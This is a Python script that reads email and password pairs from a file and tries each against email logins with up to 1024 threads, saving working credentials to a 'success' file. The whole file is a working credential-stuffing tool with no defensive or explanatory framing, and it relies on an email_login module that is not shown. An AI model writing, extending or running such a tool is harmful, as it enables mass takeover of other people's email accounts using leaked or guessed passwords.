#!/usr/bin/python3.3
import sys
import logging
import threading
import functools

from queue import Queue

import email_login as el

writelock = threading.Lock()
maxThread = 1024  
emailLogin = el.EmailLogin()
sleeptime = 60

emailQueue = Queue()



def coroutine(func):

    @functools.wraps(func)
    def start(*args, **kwargs):
        cr = func(*args, **kwargs)
        next(cr)
        return cr
    return start


class Scanner(object):

    success = open("success", "a+")
    fail = open("fail", "a+")
    ignore = open("ignore", "a+")

    def __init__(self):
        for i in range(maxThread):
            t = threading.Thread(target = self.worker)
            t.setDaemon(True)
            t.start()

    @coroutine
    def run(self):
        while True:
            email = yield
            emailQueue.put(email)

    
    def _writeToFile(self, email, password, result):
        with writelock:
            f = getattr(self, result)
            f.write(email + ' ' + password + '\n')
            f.flush()

    def worker(self):
        while True:
            email, password = emailQueue.get()

            try:
                if emailLogin.login(email, password):
                    print("Success")
                    result = 'success'
                else:
                    print("Fail")
                    result = 'fail'
            except el.emailDomainNotFind as e:
                result = 'ignore'
                logging.error(e.msg)
            except el.emailFormatError:
                return

            self._writeToFile(email, password, result)
            emailQueue.task_done()

if __name__ == '__main__':
    filename = sys.argv[1]
    scanner = Scanner()
    run = scanner.run()

    with open(filename, "r") as filehandle:
        while True:
            line = filehandle.readline()
    
            if not line:
                break

            content = line.split(' ')

            if len(content) == 2:
                email = content[0].strip().lower()
                password = content[1].strip().lower()
                run.send((email, password))
                
    emailQueue.join()

